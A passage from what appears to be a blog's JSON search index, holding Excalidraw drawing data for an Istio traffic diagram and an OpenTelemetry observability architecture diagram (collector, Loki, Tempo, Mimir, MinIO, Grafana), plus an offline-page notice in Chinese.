\"text\": \"k8s集群\", \"rawText\": \"k8s集群\", \"textAlign\": \"left\", \"verticalAlign\": \"top\", \"containerId\": null, \"originalText\": \"k8s集群\", \"lineHeight\": 1.25, \"baseline\": 18 }, { \"type\": \"rectangle\", \"version\": 141, \"versionNonce\": 1191690911, \"isDeleted\": false, \"id\": \"QX_Nn2fpIDAbRILLdjt1u\", \"fillStyle\": \"solid\", \"strokeWidth\": 2, \"strokeStyle\": \"solid\", \"roughness\": 1, \"opacity\": 100, \"angle\": 0, \"x\": -165.0540540540541, \"y\": -215.84353885135135, \"strokeColor\": \"#e03131\", \"backgroundColor\": \"transparent\", \"width\": 31.351351351351383, \"height\": 35, \"seed\": 1801635345, \"groupIds\": [], \"frameId\": null, \"roundness\": { \"type\": 3 }, \"boundElements\": [ { \"id\": \"iVoacdzzb2dXpU78El5Ns\", \"type\": \"arrow\" }, { \"id\": \"SZMLBzVqR-03t-3wCPVfK\", \"type\": \"arrow\" } ], \"updated\": 1701830756016, \"link\": null, \"locked\": false }, { \"type\": \"rectangle\", \"version\": 103, \"versionNonce\": 1401450289, \"isDeleted\": false, \"id\": \"kQKZM3F10KhHUF2BQQ_5L\", \"fillStyle\": \"solid\", \"strokeWidth\": 2, \"strokeStyle\": \"solid\", \"roughness\": 1, \"opacity\": 100, \"angle\": 0, \"x\": -256.55555555555554, \"y\": -123.32118055555554, \"strokeColor\": \"#e03131\", \"backgroundColor\": \"transparent\", \"width\": 218, \"height\": 35, \"seed\": 762997809, \"groupIds\": [], \"frameId\": null, \"roundness\": { \"type\": 3 }, \"boundElements\": [ { \"type\": \"text\", \"id\": \"F3mBci1G\" }, { \"id\": \"SZMLBzVqR-03t-3wCPVfK\", \"type\": \"arrow\" }, { \"id\": \"bxz5zZN9t-KC4t1gnXYab\", \"type\": \"arrow\" } ], \"updated\": 1701934731519, \"link\": null, \"locked\": false }, { \"type\": \"text\", \"version\": 135, \"versionNonce\": 1542807825, \"isDeleted\": false, \"id\": \"F3mBci1G\", \"fillStyle\": \"solid\", \"strokeWidth\": 2, \"strokeStyle\": \"solid\", \"roughness\": 1, \"opacity\": 100, \"angle\": 0, \"x\": -249.5254423353407, \"y\": -118.32118055555554, \"strokeColor\": \"#e03131\", \"backgroundColor\": \"transparent\", \"width\": 203.9397735595703, \"height\": 25, \"seed\": 349202481, \"groupIds\": [], \"frameId\": null, \"roundness\": null, \"boundElements\": [], \"updated\": 1701934731519, \"link\": null, \"locked\": false, \"fontSize\": 20, \"fontFamily\": 1, \"text\": \"istio-ingress-gateway\", \"rawText\": \"istio-ingress-gateway\", \"textAlign\": \"center\", \"verticalAlign\": \"middle\", \"containerId\": \"kQKZM3F10KhHUF2BQQ_5L\", \"originalText\": \"istio-ingress-gateway\", \"lineHeight\": 1.25, \"baseline\": 18 }, { \"type\": \"arrow\", \"version\": 183, \"versionNonce\": 1219295409, \"isDeleted\": false, \"id\": \"iVoacdzzb2dXpU78El5Ns\", \"fillStyle\": \"solid\", \"strokeWidth\": 2, \"strokeStyle\": \"solid\", \"roughness\": 1, \"opacity\": 100, \"angle\": 0, \"x\": -52.573308873670534, \"y\": -288.1413521935143, \"strokeColor\": \"#e03131\", \"backgroundColor\": \"transparent\", \"width\": 72.4371534917463, \"height\": 67.86748628887798, \"seed\": 1126707633, \"groupIds\": [], \"frameId\": null, \"roundness\": { \"type\": 2 }, \"boundElements\": [], \"updated\":","date":"0001-01-01","objectID":"/posts/%E9%99%84%E4%BB%B6/istio%E6%B5%81%E9%87%8F%E5%9B%BE.excalidraw/:0:0","series":null,"tags":["excalidraw"],"title":"","uri":"/posts/%E9%99%84%E4%BB%B6/istio%E6%B5%81%E9%87%8F%E5%9B%BE.excalidraw/#drawing"},{"categories":null,"content":"==⚠ Switch to EXCALIDRAW VIEW in the MORE OPTIONS menu of this document. ⚠== ","date":"0001-01-01","objectID":"/posts/%E9%99%84%E4%BB%B6/opentelemetry%E6%9E%B6%E6%9E%84%E5%9B%BE.excalidraw/:0:0","series":null,"tags":["excalidraw"],"title":"","uri":"/posts/%E9%99%84%E4%BB%B6/opentelemetry%E6%9E%B6%E6%9E%84%E5%9B%BE.excalidraw/#"},{"categories":null,"content":" Text ElementsAPP ^QtCw4hek OpenTelemetry-Collector ^uz2PAZKK loki ^hP7Fvqwc Grafana-UI ^06YNzxIT tempo ^eDgYeq1P mimir ^dS8hdf4i minio ^XWipS8lb %% ","date":"0001-01-01","objectID":"/posts/%E9%99%84%E4%BB%B6/opentelemetry%E6%9E%B6%E6%9E%84%E5%9B%BE.excalidraw/:0:0","series":null,"tags":["excalidraw"],"title":"","uri":"/posts/%E9%99%84%E4%BB%B6/opentelemetry%E6%9E%B6%E6%9E%84%E5%9B%BE.excalidraw/#text-elements"},{"categories":null,"content":" Drawing { \"type\": \"excalidraw\", \"version\": 2, \"source\": \"https://github.com/zsviczian/obsidian-excalidraw-plugin/releases/tag/1.9.23\", \"elements\": [ { \"type\": \"ellipse\", \"version\": 132, \"versionNonce\": 194948672, \"isDeleted\": false, \"id\": \"r19wscS4Z-xgo2F0kf2K9\", \"fillStyle\": \"hachure\", \"strokeWidth\": 1, \"strokeStyle\": \"solid\", \"roughness\": 1, \"opacity\": 100, \"angle\": 0, \"x\": -99.75, \"y\": -481.86328125, \"strokeColor\": \"#1e1e1e\", \"backgroundColor\": \"transparent\", \"width\": 126.5, \"height\": 49, \"seed\": 43234841, \"groupIds\": [], \"frameId\": null, \"roundness\": { \"type\": 2 }, \"boundElements\": [ { \"type\": \"text\", \"id\": \"QtCw4hek\" }, { \"id\": \"hPinXEoxWQFK0QOfQepwP\", \"type\": \"arrow\" } ], \"updated\": 1697807217962, \"link\": null, \"locked\": false }, { \"type\": \"text\", \"version\": 137, \"versionNonce\": 1045975225, \"isDeleted\": false, \"id\": \"QtCw4hek\", \"fillStyle\": \"hachure\", \"strokeWidth\": 1, \"strokeStyle\": \"solid\", \"roughness\": 1, \"opacity\": 100, \"angle\": 0, \"x\": -56.50448743055695, \"y\": -469.68739738907044, \"strokeColor\": \"#1e1e1e\", \"backgroundColor\": \"transparent\", \"width\": 39.559967041015625, \"height\": 25, \"seed\": 1383276505, \"groupIds\": [], \"frameId\": null, \"roundness\": null, \"boundElements\": [], \"updated\": 1697807860215, \"link\": null, \"locked\": false, \"fontSize\": 20, \"fontFamily\": 1, \"text\": \"APP\", \"rawText\": \"APP\", \"textAlign\": \"center\", \"verticalAlign\": \"middle\", \"containerId\": \"r19wscS4Z-xgo2F0kf2K9\", \"originalText\": \"APP\", \"lineHeight\": 1.25, \"baseline\": 18 }, { \"type\": \"arrow\", \"version\": 775, \"versionNonce\": 1012972023, \"isDeleted\": false, \"id\": \"hPinXEoxWQFK0QOfQepwP\", \"fillStyle\": \"hachure\", \"strokeWidth\": 1, \"strokeStyle\": \"solid\", \"roughness\": 1, \"opacity\": 100, \"angle\": 0, \"x\": -35.00964229969971, \"y\": -422.36666013577775, \"strokeColor\": \"#1e1e1e\", \"backgroundColor\": \"transparent\", \"width\": 5.279888875779413, \"height\": 75.18702990720868, \"seed\": 1501827479, \"groupIds\": [], \"frameId\": null, \"roundness\": { \"type\": 2 }, \"boundElements\": [], \"updated\": 1697807866903, \"link\": null, \"locked\": false, \"startBinding\": { \"elementId\": \"r19wscS4Z-xgo2F0kf2K9\", \"gap\": 10.503768409886188, \"focus\": 0.015286425218479203 }, \"endBinding\": { \"elementId\": \"KYGFf97oOlftXhcurkdL8\", \"gap\": 5.00786625065831, \"focus\": 0.07599684442597097 }, \"lastCommittedPoint\": null, \"startArrowhead\": null, \"endArrowhead\": \"arrow\", \"points\": [ [ 0, 0 ], [ 5.279888875779413, 75.18702990720868 ] ] }, { \"type\": \"ellipse\", \"version\": 399, \"versionNonce\": 323591616, \"isDeleted\": false, \"id\": \"KYGFf97oOlftXhcurkdL8\", \"fillStyle\": \"hachure\", \"strokeWidth\": 1, \"strokeStyle\": \"solid\", \"roughness\": 1, \"opacity\": 100, \"angle\": 0, \"x\": -201.25, \"y\": -342.2406953810554, \"strokeColor\": \"#1e1e1e\", \"backgroundColor\": \"transparent\", \"width\": 325.00000000000006, \"height\": 85, \"seed\": 609352857, \"groupIds\": [], \"frameId\": null, \"roundness\": { \"type\": 2 }, \"boundElements\": [ { \"id\": \"hPinXEoxWQFK0QOfQepwP\", \"type\": \"arrow\" }, { \"type\": \"text\", \"id\": \"uz2PAZKK\" }, { \"id\": \"WS-IZw8bbbcwceXq5-JLT\", \"type\": \"arrow\" }, { \"id\": \"iiSfxM-Ze-deoPMgnevhI\", \"type\": \"arrow\" } ], \"updated\": 1697807217962, \"link\": null, \"locked\": false }, { \"type\": \"text\", \"version\": 376, \"versionNonce\": 1442324032, \"isDeleted\": false, \"id\": \"uz2PAZKK\", \"fillStyle\": \"hachure\", \"strokeWidth\": 1, \"strokeStyle\": \"solid\", \"roughness\": 1, \"opacity\": 100, \"angle\": 0, \"x\": -113.14477351263818, \"y\": -324.7927335814837, \"strokeColor\": \"#1e1e1e\", \"backgroundColor\": \"transparent\", \"width\": 148.97984313964844, \"height\": 50, \"seed\": 460916089, \"groupIds\": [], \"frameId\": null, \"roundness\": null, \"boundElements\": [], \"updated\": 1697807217963, \"link\": null, \"locked\": false, \"fontSize\": 20, \"fontFamily\": 1, \"text\": \"OpenTelemetry-\\nCollector\", \"rawText\": \"OpenTelemetry-Collector\", \"textAlign\": \"center\", \"verticalAlign\": \"middle\", \"containerId\": \"KYGFf97oOlftXhcurkdL8\", \"originalText\": \"OpenTelemetry-Collector\", \"lineHeight\": 1.25, \"baseline\": 43 }, { \"type\": \"ellipse\", \"version\": 195, \"versionNonce\": 916010432, \"isDeleted\": false, \"i","date":"0001-01-01","objectID":"/posts/%E9%99%84%E4%BB%B6/opentelemetry%E6%9E%B6%E6%9E%84%E5%9B%BE.excalidraw/:0:0","series":null,"tags":["excalidraw"],"title":"","uri":"/posts/%E9%99%84%E4%BB%B6/opentelemetry%E6%9E%B6%E6%9E%84%E5%9B%BE.excalidraw/#drawing"},{"categories":null,"content":" 你没有连接至互联网, 只有缓存的页面可用. ","date":"0001-01-01","objectID":"/offline/:0:0","series":null,"tags":null,"title":"Offline","uri":"/offline/#"}]